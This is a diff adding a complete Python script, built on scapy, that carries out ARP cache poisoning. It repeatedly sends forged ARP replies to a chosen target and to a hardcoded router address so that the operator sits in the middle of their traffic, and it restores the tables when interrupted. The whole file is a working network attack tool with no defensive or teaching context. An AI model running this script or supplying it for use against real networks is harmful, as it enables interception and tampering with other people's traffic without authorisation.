@@ -1,0 +1,61 @@
+import time
+
+import scapy.all as scapy
+import argparse
+import time
+import sys
+
+target_ip = str()
+my_fake_ip = str()
+parser = argparse.ArgumentParser()
+parser.add_argument('-t', '--target', dest='target')
+parser.add_argument('-i', '--fake_ip', dest='fakeip')
+options = parser.parse_args()
+target_ip = options.target
+my_fake_ip = options.fakeip
+router_ip = '10.0.2.1' #make this automatic in future
+
+
+if target_ip is None:
+    target_ip = input("Enter The IP Address to Poisen the ARP Table for : ")
+
+if my_fake_ip is None:
+    my_fake_ip = input(f"Enter Your New Spoof IP for {target_ip}: ")
+
+
+def get_mac_from_ip(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    my_answered_packet = answered_list[0][1]
+    there_mac = my_answered_packet.hwsrc
+    return there_mac
+
+
+def spoof(target_ip, my_fake_ip):
+    there_mac = get_mac_from_ip(target_ip)
+    reply_packet = scapy.ARP(pdst=target_ip, psrc=my_fake_ip, hwdst=there_mac, op=2)
+    scapy.send(reply_packet, verbose=False)
+
+
+def restore_target_arp_table(target_ip, my_spoof_ip):
+    real_mac = get_mac_from_ip(my_spoof_ip)
+    target_mac = get_mac_from_ip(target_ip)
+    resolving_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc=real_mac, psrc=my_spoof_ip)
+    scapy.send(resolving_packet)
+
+
+sent_packets_count = 0
+try:
+    print('Press Ctrl + C to stop...')
+    while True:
+        spoof(target_ip, my_fake_ip)
+        spoof(router_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print(f'\r[+] Packets Sent : {sent_packets_count}', end=' ')
+        time.sleep(2)
+except KeyboardInterrupt:
+    restore_target_arp_table(target_ip, router_ip)
+    restore_target_arp_table(router_ip, target_ip)
+    print('\n[-]ARP Spoofer Stopped...')
